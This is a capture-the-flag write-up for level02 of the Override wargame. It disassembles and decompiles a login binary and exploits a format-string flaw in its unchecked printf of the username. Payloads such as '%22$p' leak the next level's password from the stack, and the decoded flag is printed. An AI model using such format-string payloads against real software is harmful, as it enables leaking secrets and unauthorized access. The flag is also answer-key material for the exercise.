What do we have?

	$ ll
	total 21
	dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 ./
	dr-x--x--x  1 root    root     260 Oct  2  2016 ../
	-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
	lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
	-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
	-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02*
	-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
	-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile

A `level02` binary. Let's check the assembly:

	$ gdb ./level02
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x0000000000400814 <+0>:     push   %rbp
	0x0000000000400815 <+1>:     mov    %rsp,%rbp
	=> 0x0000000000400818 <+4>:     sub    $0x120,%rsp
	0x000000000040081f <+11>:    mov    %edi,-0x114(%rbp)
	0x0000000000400825 <+17>:    mov    %rsi,-0x120(%rbp)
	0x000000000040082c <+24>:    lea    -0x70(%rbp),%rdx
	0x0000000000400830 <+28>:    mov    $0x0,%eax
	0x0000000000400835 <+33>:    mov    $0xc,%ecx
	0x000000000040083a <+38>:    mov    %rdx,%rdi
	0x000000000040083d <+41>:    rep stos %rax,%es:(%rdi)
	0x0000000000400840 <+44>:    mov    %rdi,%rdx
	0x0000000000400843 <+47>:    mov    %eax,(%rdx)
	0x0000000000400845 <+49>:    add    $0x4,%rdx
	0x0000000000400849 <+53>:    lea    -0xa0(%rbp),%rdx
	0x0000000000400850 <+60>:    mov    $0x0,%eax
	0x0000000000400855 <+65>:    mov    $0x5,%ecx
	0x000000000040085a <+70>:    mov    %rdx,%rdi
	0x000000000040085d <+73>:    rep stos %rax,%es:(%rdi)
	0x0000000000400860 <+76>:    mov    %rdi,%rdx
	0x0000000000400863 <+79>:    mov    %al,(%rdx)
	0x0000000000400865 <+81>:    add    $0x1,%rdx
	0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx
	0x0000000000400870 <+92>:    mov    $0x0,%eax
	0x0000000000400875 <+97>:    mov    $0xc,%ecx
	0x000000000040087a <+102>:   mov    %rdx,%rdi
	0x000000000040087d <+105>:   rep stos %rax,%es:(%rdi)
	0x0000000000400880 <+108>:   mov    %rdi,%rdx
	0x0000000000400883 <+111>:   mov    %eax,(%rdx)
	0x0000000000400885 <+113>:   add    $0x4,%rdx
	0x0000000000400889 <+117>:   movq   $0x0,-0x8(%rbp)
	0x0000000000400891 <+125>:   movl   $0x0,-0xc(%rbp)
	0x0000000000400898 <+132>:   mov    $0x400bb0,%edx
	0x000000000040089d <+137>:   mov    $0x400bb2,%eax
	0x00000000004008a2 <+142>:   mov    %rdx,%rsi
	0x00000000004008a5 <+145>:   mov    %rax,%rdi
	0x00000000004008a8 <+148>:   callq  0x400700 <fopen@plt>
	0x00000000004008ad <+153>:   mov    %rax,-0x8(%rbp)
	0x00000000004008b1 <+157>:   cmpq   $0x0,-0x8(%rbp)
	0x00000000004008b6 <+162>:   jne    0x4008e6 <main+210>
	0x00000000004008b8 <+164>:   mov    0x200991(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
	0x00000000004008bf <+171>:   mov    %rax,%rdx
	0x00000000004008c2 <+174>:   mov    $0x400bd0,%eax
	0x00000000004008c7 <+179>:   mov    %rdx,%rcx
	0x00000000004008ca <+182>:   mov    $0x24,%edx
	0x00000000004008cf <+187>:   mov    $0x1,%esi
	0x00000000004008d4 <+192>:   mov    %rax,%rdi
	0x00000000004008d7 <+195>:   callq  0x400720 <fwrite@plt>
	0x00000000004008dc <+200>:   mov    $0x1,%edi
	0x00000000004008e1 <+205>:   callq  0x400710 <exit@plt>
	0x00000000004008e6 <+210>:   lea    -0xa0(%rbp),%rax
	0x00000000004008ed <+217>:   mov    -0x8(%rbp),%rdx
	0x00000000004008f1 <+221>:   mov    %rdx,%rcx
	0x00000000004008f4 <+224>:   mov    $0x29,%edx
	0x00000000004008f9 <+229>:   mov    $0x1,%esi
	0x00000000004008fe <+234>:   mov    %rax,%rdi
	0x0000000000400901 <+237>:   callq  0x400690 <fread@plt>
	0x0000000000400906 <+242>:   mov    %eax,-0xc(%rbp)
	0x0000000000400909 <+245>:   lea    -0xa0(%rbp),%rax
	0x0000000000400910 <+252>:   mov    $0x400bf5,%esi
	0x0000000000400915 <+257>:   mov    %rax,%rdi
	0x0000000000400918 <+260>:   callq  0x4006d0 <strcspn@plt>
	0x000000000040091d <+265>:   movb   $0x0,-0xa0(%rbp,%rax,1)
	0x0000000000400925 <+273>:   cmpl   $0x29,-0xc(%rbp)
	0x0000000000400929 <+277>:   je     0x40097d <main+361>
	0x000000000040092b <+279>:   mov    0x20091e(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
	0x0000000000400932 <+286>:   mov    %rax,%rdx
	0x0000000000400935 <+289>:   mov    $0x400bf8,%eax
	0x000000000040093a <+294>:   mov    %rdx,%rcx
	0x000000000040093d <+297>:   mov    $0x24,%edx
	0x0000000000400942 <+302>:   mov    $0x1,%esi
	0x0000000000400947 <+307>:   mov    %rax,%rdi
	0x000000000040094a <+310>:   callq  0x400720 <fwrite@plt>
	0x000000000040094f <+315>:   mov    0x2008fa(%rip),%rax        # 0x601250 <stderr@@GLIBC_2.2.5>
	0x0000000000400956 <+322>:   mov    %rax,%rdx
	0x0000000000400959 <+325>:   mov    $0x400bf8,%eax
	0x000000000040095e <+330>:   mov    %rdx,%rcx
	0x0000000000400961 <+333>:   mov    $0x24,%edx
	0x0000000000400966 <+338>:   mov    $0x1,%esi
	0x000000000040096b <+343>:   mov    %rax,%rdi
	0x000000000040096e <+346>:   callq  0x400720 <fwrite@plt>
	0x0000000000400973 <+351>:   mov    $0x1,%edi
	0x0000000000400978 <+356>:   callq  0x400710 <exit@plt>
	0x000000000040097d <+361>:   mov    -0x8(%rbp),%rax
	0x0000000000400981 <+365>:   mov    %rax,%rdi
	0x0000000000400984 <+368>:   callq  0x4006a0 <fclose@plt>
	0x0000000000400989 <+373>:   mov    $0x400c20,%edi
	0x000000000040098e <+378>:   callq  0x400680 <puts@plt>
	0x0000000000400993 <+383>:   mov    $0x400c50,%edi
	0x0000000000400998 <+388>:   callq  0x400680 <puts@plt>
	0x000000000040099d <+393>:   mov    $0x400c80,%edi
	0x00000000004009a2 <+398>:   callq  0x400680 <puts@plt>
	0x00000000004009a7 <+403>:   mov    $0x400cb0,%edi
	0x00000000004009ac <+408>:   callq  0x400680 <puts@plt>
	0x00000000004009b1 <+413>:   mov    $0x400cd9,%eax
	0x00000000004009b6 <+418>:   mov    %rax,%rdi
	0x00000000004009b9 <+421>:   mov    $0x0,%eax
	0x00000000004009be <+426>:   callq  0x4006c0 <printf@plt>
	0x00000000004009c3 <+431>:   mov    0x20087e(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
	0x00000000004009ca <+438>:   mov    %rax,%rdx
	0x00000000004009cd <+441>:   lea    -0x70(%rbp),%rax
	0x00000000004009d1 <+445>:   mov    $0x64,%esi
	0x00000000004009d6 <+450>:   mov    %rax,%rdi
	0x00000000004009d9 <+453>:   callq  0x4006f0 <fgets@plt>
	0x00000000004009de <+458>:   lea    -0x70(%rbp),%rax
	0x00000000004009e2 <+462>:   mov    $0x400bf5,%esi
	0x00000000004009e7 <+467>:   mov    %rax,%rdi
	0x00000000004009ea <+470>:   callq  0x4006d0 <strcspn@plt>
	0x00000000004009ef <+475>:   movb   $0x0,-0x70(%rbp,%rax,1)
	0x00000000004009f4 <+480>:   mov    $0x400ce8,%eax
	0x00000000004009f9 <+485>:   mov    %rax,%rdi
	0x00000000004009fc <+488>:   mov    $0x0,%eax
	0x0000000000400a01 <+493>:   callq  0x4006c0 <printf@plt>
	0x0000000000400a06 <+498>:   mov    0x20083b(%rip),%rax        # 0x601248 <stdin@@GLIBC_2.2.5>
	0x0000000000400a0d <+505>:   mov    %rax,%rdx
	0x0000000000400a10 <+508>:   lea    -0x110(%rbp),%rax
	0x0000000000400a17 <+515>:   mov    $0x64,%esi
	0x0000000000400a1c <+520>:   mov    %rax,%rdi
	0x0000000000400a1f <+523>:   callq  0x4006f0 <fgets@plt>
	0x0000000000400a24 <+528>:   lea    -0x110(%rbp),%rax
	0x0000000000400a2b <+535>:   mov    $0x400bf5,%esi
	0x0000000000400a30 <+540>:   mov    %rax,%rdi
	0x0000000000400a33 <+543>:   callq  0x4006d0 <strcspn@plt>
	0x0000000000400a38 <+548>:   movb   $0x0,-0x110(%rbp,%rax,1)
	0x0000000000400a40 <+556>:   mov    $0x400cf8,%edi
	0x0000000000400a45 <+561>:   callq  0x400680 <puts@plt>
	0x0000000000400a4a <+566>:   lea    -0x110(%rbp),%rcx
	0x0000000000400a51 <+573>:   lea    -0xa0(%rbp),%rax
	0x0000000000400a58 <+580>:   mov    $0x29,%edx
	0x0000000000400a5d <+585>:   mov    %rcx,%rsi
	0x0000000000400a60 <+588>:   mov    %rax,%rdi
	0x0000000000400a63 <+591>:   callq  0x400670 <strncmp@plt>
	---Type <return> to continue, or q <return> to quit---
	0x0000000000400a68 <+596>:   test   %eax,%eax
	0x0000000000400a6a <+598>:   jne    0x400a96 <main+642>
	0x0000000000400a6c <+600>:   mov    $0x400d22,%eax
	0x0000000000400a71 <+605>:   lea    -0x70(%rbp),%rdx
	0x0000000000400a75 <+609>:   mov    %rdx,%rsi
	0x0000000000400a78 <+612>:   mov    %rax,%rdi
	0x0000000000400a7b <+615>:   mov    $0x0,%eax
	0x0000000000400a80 <+620>:   callq  0x4006c0 <printf@plt>
	0x0000000000400a85 <+625>:   mov    $0x400d32,%edi
	0x0000000000400a8a <+630>:   callq  0x4006b0 <system@plt>
	0x0000000000400a8f <+635>:   mov    $0x0,%eax
	0x0000000000400a94 <+640>:   leaveq
	0x0000000000400a95 <+641>:   retq
	0x0000000000400a96 <+642>:   lea    -0x70(%rbp),%rax
	0x0000000000400a9a <+646>:   mov    %rax,%rdi
	0x0000000000400a9d <+649>:   mov    $0x0,%eax
	0x0000000000400aa2 <+654>:   callq  0x4006c0 <printf@plt>
	0x0000000000400aa7 <+659>:   mov    $0x400d3a,%edi
	0x0000000000400aac <+664>:   callq  0x400680 <puts@plt>
	0x0000000000400ab1 <+669>:   mov    $0x1,%edi
	0x0000000000400ab6 <+674>:   callq  0x400710 <exit@plt>
	End of assembler dump.

Cleaned `Ghidra`:

	int	main(void)
	{
		int		iVar1;
		size_t	sVar2;
		long	lVar3;
		char	*pcVar4;
		char	local_118[112];
		char	local_a8[48];
		char	local_78[100];
		int		local_14;
		FILE	*local_10;

		pcVar4 = local_78;
		for (lVar3 = 12; lVar3 != 0; lVar3--)
		{
			pcVar4[0] = '\0';
			pcVar4[1] = '\0';
			pcVar4[2] = '\0';
			pcVar4[3] = '\0';
			pcVar4[4] = '\0';
			pcVar4[5] = '\0';
			pcVar4[6] = '\0';
			pcVar4[7] = '\0';
			pcVar4 = pcVar4 + 8;
		}
		pcVar4[0] = '\0';
		pcVar4[1] = '\0';
		pcVar4[2] = '\0';
		pcVar4[3] = '\0';
		pcVar4 = local_a8;
		for (lVar3 = 5; lVar3 != 0; lVar3--)
		{
			pcVar4[0] = '\0';
			pcVar4[1] = '\0';
			pcVar4[2] = '\0';
			pcVar4[3] = '\0';
			pcVar4[4] = '\0';
			pcVar4[5] = '\0';
			pcVar4[6] = '\0';
			pcVar4[7] = '\0';
			pcVar4 = pcVar4 + 8;
		}
		*pcVar4 = '\0';
		pcVar4 = local_118;
		for (lVar3 = 12; lVar3 != 0; lVar3--)
		{
			pcVar4[0] = '\0';
			pcVar4[1] = '\0';
			pcVar4[2] = '\0';
			pcVar4[3] = '\0';
			pcVar4[4] = '\0';
			pcVar4[5] = '\0';
			pcVar4[6] = '\0';
			pcVar4[7] = '\0';
			pcVar4 = pcVar4 + 8;
		}
		pcVar4[0] = '\0';
		pcVar4[1] = '\0';
		pcVar4[2] = '\0';
		pcVar4[3] = '\0';
		local_10 = (FILE *)0;
		local_14 = 0;
		local_10 = fopen("/home/users/level03/.pass", "r");
		if (local_10 == (FILE *)0x0)
		{
			fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
			exit(1);
		}

Manual `memset` of variables.

		sVar2 = fread(local_a8, 1, 41, local_10);
		local_14 = (int)sVar2;
		sVar2 = strcspn(local_a8, "\n");
		local_a8[sVar2] = '\0';
		if (local_14 != 41)
		{
			fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
			fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
			exit(1);
		}
		fclose(local_10);

Read the flag and put it inside `local_a8`.

		puts("===== [ Secure Access System v1.0 ] =====");
		puts("/***************************************\\");
		puts("| You must login to access this system. |");
		puts("\\**************************************/");
		printf("--[ Username: ");
		fgets(local_78, 100, stdin);
		sVar2 = strcspn(local_78,"\n");
		local_78[sVar2] = '\0';
		printf("--[ Password: ");
		fgets(local_118, 100, stdin);
		sVar2 = strcspn(local_118,"\n");
		local_118[sVar2] = '\0';
		puts("*****************************************");

A login system.

		iVar1 = strncmp(local_a8, local_118, 41);
		if (iVar1 == 0)
		{
			printf("Greetings, %s!\n", local_78);
			system("/bin/sh");
			return 0;
		}
		printf(local_78);
		puts(" does not have access!");
		exit(1);
	}

If we have it right start a shell, otherwise do a `printf` of our input. This let us exploit the format string. The buffers are above in the stack, so we'll just use `%x` to fetch it directly.

	$ ./level02
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
	--[ Password: *****************************************
	ffffe500 0 25 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 25207825 20782520 78252078 25207825 782520 0 0 0 0 0 0 0 0 0 34376848 61733951 574e6758 6e475873 664b394d 0 25207825 20782520 78252078 25207825 20782520 78252078  does not have access!

`2a2a2a2a 2a2a2a2a` are the `*`, `ffffe6f8 f7ff9a08` seems like addresses, `25207825 20782520 78252078 25207825 782520` is our input (`% x%`), then there is `0`s, and the `34376848 61733951 574e6758 6e475873 664b394d` string. Converting it from hexa to decimal into char gives us `47hH as9Q WNgX nGXs fK9M`, but we also need to take into account that the stack use the little endian. `47hH as9Q WNgX nGXs fK9M` => `Hh74 Q9sa XgNW sXGn M9Kf`. That's 20 char, but we know the flag is 40 chars due to the `fread`...

After talking with a friend, we realized the VM for Override is in 64 bits, unlike Snow_crash and Rainfall! So the arguments are not espaced by 4 bytes, but 8! So we'll use `%p` instead, and as the string starts from the 22th argument and that 40 chars (flag) / 8 (bytes read by `%p`) = 5, we'll do 5 `%p` starting from the 22th argument.

	$ ./level02
	===== [ Secure Access System v1.0 ] =====
	/***************************************\
	| You must login to access this system. |
	\**************************************/
	--[ Username: %22$p %23$p %24$p %25$p %26$p
	--[ Password:
	*****************************************
	0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!

`0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d` to char in little endian : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`. And...!

	$ su level03
	Password:
	RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
	Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03

	$ cat .pass
	Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
